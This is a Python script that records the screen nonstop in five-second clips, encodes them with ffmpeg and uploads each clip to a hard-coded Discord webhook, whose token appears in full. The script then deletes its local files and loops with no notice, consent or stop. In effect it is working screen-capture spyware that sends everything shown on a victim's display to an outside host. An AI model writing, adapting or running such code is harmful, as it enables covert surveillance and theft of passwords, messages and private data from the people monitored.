import cv2  # Importing OpenCV
import pyautogui
import numpy as np
import requests
import time
from datetime import datetime
import subprocess
import os

# Webhook URL for Discord (replace with your actual webhook URL)
WEBHOOK_URL = "https://discord.com/api/webhooks/1363652821265944609/sR4gSwvCF5852_whYbT6eu72npzQZZ3hnPa1rV0BIpSqsnTr6fdmJkRDyPIzz0pqYtLJ"

# Set screen capture settings
SCREEN_WIDTH, SCREEN_HEIGHT = pyautogui.size()
FPS = 60  # Set frames per second to 60
INTERVAL = 5  # 2 minutes in seconds
VIDEO_RESOLUTION = (1280, 720)  # 720p resolution

def capture_screen():
    # Capture the screen using pyautogui
    screenshot = pyautogui.screenshot()
    frame = np.array(screenshot)
    frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)  # Convert RGB to BGR
    return frame

def save_and_send_video(video_file):
    # Send the video to the webhook
    files = {'file': open(video_file, 'rb')}
    data = {'timestamp': datetime.now().isoformat()}
    response = requests.post(WEBHOOK_URL, files=files, data=data)
    files['file'].close()

    if response.status_code == 200:
        print("Video successfully uploaded.")
    else:
        print(f"Failed to upload video. Status code: {response.status_code}")
    
    # Optionally, you can delete the local video file after upload
    # os.remove(video_file)

def record_video():
    while True:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        video_file = f"screen_record_{timestamp}.mp4"  # Save as .mp4 file
        
        # Temporary directory to store individual frames
        frame_dir = f"frames_{timestamp}"
        os.makedirs(frame_dir, exist_ok=True)

        start_time = time.time()
        frame_count = 0

        while time.time() - start_time < INTERVAL:
            frame = capture_screen()
            frame_resized = cv2.resize(frame, VIDEO_RESOLUTION)

            # Save frames to temporary directory
            frame_file = os.path.join(frame_dir, f"frame_{frame_count:04d}.png")
            cv2.imwrite(frame_file, frame_resized)
            frame_count += 1

        # Use ffmpeg to combine frames into a video file using H.264 codec
        ffmpeg_cmd = [
            "ffmpeg",
            "-framerate", str(FPS),
            "-i", os.path.join(frame_dir, "frame_%04d.png"),  # Frame file pattern
            "-c:v", "libx264",  # Use H.264 codec
            "-pix_fmt", "yuv420p",  # Pixel format compatible with most players
            video_file
        ]

        # Run ffmpeg command to encode the video
        subprocess.run(ffmpeg_cmd)

        # Clean up: remove temporary frames directory
        for file_name in os.listdir(frame_dir):
            os.remove(os.path.join(frame_dir, file_name))
        os.rmdir(frame_dir)

        save_and_send_video(video_file)
        os.remove(video_file)  # Remove the video file after uploading

        time.sleep(1)  # Wait a second before starting the next recording interval

if __name__ == "__main__":
    record_video()
